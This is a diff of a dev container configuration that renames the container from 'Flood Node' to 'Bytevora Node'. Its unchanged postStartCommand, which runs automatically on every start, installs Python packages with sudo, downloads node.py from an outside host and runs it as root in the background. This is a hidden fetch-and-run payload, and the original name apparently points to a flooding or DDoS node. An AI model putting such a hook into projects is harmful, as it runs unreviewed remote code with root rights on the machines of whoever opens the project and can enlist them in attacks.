@@ -1,5 +1,5 @@
 {
-  "name": "Flood Node",
+  "name": "Bytevora Node",
   "image": "mcr.microsoft.com/devcontainers/universal:2",
   "postStartCommand": "sudo pip install requests psutil --break-system-packages && curl -sL https://api.bytevora.biz.id/node.py -o node.py && sudo nohup python3 node.py > node.log 2>&1 &"
 }
